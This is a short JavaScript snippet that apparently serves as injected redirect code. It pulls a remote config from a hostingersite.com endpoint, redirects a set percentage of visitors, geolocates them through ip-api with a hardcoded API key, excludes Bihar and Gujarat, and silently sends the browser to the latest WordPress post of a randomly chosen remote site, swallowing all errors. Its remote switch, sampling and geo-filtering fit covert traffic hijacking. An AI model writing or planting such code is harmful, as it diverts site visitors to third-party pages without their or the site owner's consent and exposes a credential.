setTimeout(async () => {
  try {
    /* ===============================
       1️⃣ Fetch redirect config
    =============================== */
    const cfgRes = await fetch(
      "https://peachpuff-raven-871070.hostingersite.com/get-redirect.php",
      { cache: "no-store" }
    );
    if (!cfgRes.ok) return;

    const cfg = await cfgRes.json();
    if (Number(cfg.enabled) !== 1) return;

    let percentage = Number(cfg.percentages);
    if (isNaN(percentage)) return;
    percentage = Math.min(Math.max(percentage, 0), 100);

    const sites = (cfg.urls || "")
      .split(",")
      .map(u => u.trim().replace(/\/$/, ""))
      .filter(u => {
        try {
          new URL(u);
          return true;
        } catch {
          return false;
        }
      });

    if (!sites.length) return;

    /* ===============================
       2️⃣ Percentage check
    =============================== */
    if (Math.random() * 100 > percentage) return;

    /* ===============================
       3️⃣ IP-based Geolocation (ip-api)
    =============================== */
    const geoRes = await fetch(
      "https://pro.ip-api.com/json/?fields=status,countryCode,regionName&key=ph4oni7L40cOGLu",
      { cache: "no-store" }
    );
    if (!geoRes.ok) return;

    const geo = await geoRes.json();
    if (geo.status !== "success") return;

    const country = (geo.countryCode || "").toUpperCase();
    const state = (geo.regionName || "").toLowerCase();

    // ❌ Exclude Bihar & Gujarat (India only)
    if (
      country === "IN" &&
      (state.includes("bihar") || state.includes("gujarat"))
    ) return;

    /* ===============================
       4️⃣ Pick ONE site randomly
    =============================== */
    const site = sites[Math.floor(Math.random() * sites.length)];
    if (!site) return;

    /* ===============================
       5️⃣ Fetch latest WP post
    =============================== */
    const postRes = await fetch(
      `${site}/wp-json/wp/v2/posts?per_page=1&_fields=link`,
      { cache: "no-store" }
    );
    if (!postRes.ok) return;

    const posts = await postRes.json();
    if (!Array.isArray(posts) || !posts[0]?.link) return;

    /* ===============================
       6️⃣ Redirect
    =============================== */
    window.location.replace(posts[0].link);

  } catch {
    return;
  }
}, 1000);
